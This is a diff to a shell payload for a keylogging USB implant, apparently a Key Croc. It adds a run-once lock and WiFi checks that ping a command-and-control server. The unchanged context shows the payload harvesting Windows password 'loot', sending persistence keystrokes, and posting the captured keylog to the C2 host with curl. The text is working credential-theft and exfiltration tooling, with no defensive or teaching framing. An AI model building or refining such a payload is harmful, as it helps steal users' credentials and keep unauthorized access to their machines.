@@ -55,6 +55,10 @@ MATCH \[ENTER\]
 # MATCH \[ENTER\]
 # if [ $(date +%s) -gt $(($(stat -f%B /root 2>/dev/null || echo 0) + 30)) ]; then exit; fi
 
+# One-shot lock — exit immediately if already running or already completed this session
+[ -f /tmp/creds_lock ] && exit 0
+touch /tmp/creds_lock
+
 log INFO "STEP 1: Trigger fired — cleaning old loot"
 rm -f /root/loot/win-pass*
 
@@ -160,6 +164,17 @@ log INFO "STEP 5 OK: Persistence HID commands sent"
 
 #####################Exfiltrating Credentials###############################
 # curl uses KeyCroc's own WiFi interface — no RNDIS, no USB NIC, no popups.
+
+# WiFi diagnostics — logged so you can backtrack connectivity issues in arming mode
+log INFO "WIFI DIAG: SSID=$(iwgetid -r 2>/dev/null || echo 'unknown')"
+log INFO "WIFI DIAG: wlan0 addr=$(ip addr show wlan0 2>/dev/null | awk '/inet /{print $2}' || echo 'no IP')"
+log INFO "WIFI DIAG: default route=$(ip route show default 2>/dev/null || echo 'none')"
+if ping -c 1 -W 2 "$C2_IP" &>/dev/null; then
+    log INFO "WIFI DIAG: ping $C2_IP OK"
+else
+    log ERROR "WIFI DIAG: ping $C2_IP FAILED — KeyCroc cannot reach C2. Check WiFi config at /root/udisk/config.txt"
+fi
+
 log INFO "STEP 6: Exfiltrating keylog to C2 at ${C2_IP}:${C2_PORT}"
 
 CLEAN_PASS=$(curl -s -w "\n__HTTP_%{http_code}" -X POST "http://${C2_IP}:${C2_PORT}/keylog" \
